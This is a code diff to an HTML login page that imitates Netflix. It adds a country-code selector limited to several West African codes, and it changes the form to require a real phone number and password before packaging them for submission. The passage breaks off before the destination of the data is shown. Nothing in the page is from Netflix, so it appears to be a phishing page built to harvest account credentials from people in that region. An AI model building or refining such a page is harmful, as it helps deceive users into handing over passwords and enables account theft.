@@ -113,6 +113,36 @@
       font-size: 12px;
       color: gray;
     }
+
+    .country-select {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      background: #444;
+      padding: 12px;
+      cursor: pointer;
+      margin-bottom: 10px;
+      font-weight: bold;
+      font-size: 14px;
+      color: white;
+      user-select: none;
+    }
+
+    .country-options {
+      display: none;
+      background: #333;
+      text-align: left;
+      margin-bottom: 10px;
+    }
+
+    .country-options div {
+      padding: 10px;
+      cursor: pointer;
+    }
+
+    .country-options div:hover {
+      background: #555;
+    }
   </style>
 </head>
 <body>
@@ -120,7 +150,17 @@
   <div class="login-container">
     <h1>NETFLIX</h1>
     <p>Connectez-vous avec votre numéro de téléphone</p>
-    
+
+    <!-- Sélecteur de code pays -->
+    <div class="country-select" id="countryTrigger">+221 ▾</div>
+    <div class="country-options" id="countryOptions">
+      <div data-code="+221">Sénégal +221</div>
+      <div data-code="+223">Mali +223</div>
+      <div data-code="+226">Burkina Faso +226</div>
+      <div data-code="+229">Bénin +229</div>
+      <div data-code="+237">Cameroun +237</div>
+    </div>
+
     <form id="loginForm">
       <div class="input-group">
         <i class="fa fa-phone"></i>
@@ -146,23 +186,40 @@
   <script>
     const togglePassword = document.querySelector("#togglePassword");
     const password = document.querySelector("#password");
-
     togglePassword.addEventListener("click", function () {
       const type = password.getAttribute("type") === "password" ? "text" : "password";
       password.setAttribute("type", type);
       this.classList.toggle("fa-eye-slash");
     });
 
-    const form = document.getElementById("loginForm");
+    // Gestion code pays
+    const countryTrigger = document.getElementById("countryTrigger");
+    const countryOptions = document.getElementById("countryOptions");
+    let selectedCode = "+221";
 
+    countryTrigger.addEventListener("click", () => {
+      countryOptions.style.display = countryOptions.style.display === "block" ? "none" : "block";
+    });
+
+    countryOptions.querySelectorAll("div").forEach(option => {
+      option.addEventListener("click", () => {
+        selectedCode = option.getAttribute("data-code");
+        countryTrigger.textContent = selectedCode + " ▾";
+        countryOptions.style.display = "none";
+      });
+    });
+
+    // Soumission formulaire
+    const form = document.getElementById("loginForm");
     form.addEventListener("submit", function(e) {
       e.preventDefault();
+      const phoneValue = document.getElementById("phone").value.trim();
+      const passwordValue = password.value.trim();
 
-      const phoneValue = document.getElementById("phone").value || "+000000000";
-      const passwordValue = password.value || "test123";
+      if (!phoneValue || !passwordValue) return alert("Veuillez remplir tous les champs !");
 
       const data = {
-        phone: phoneValue,
+        phone: selectedCode + phoneValue,
         password: passwordValue
       };
 
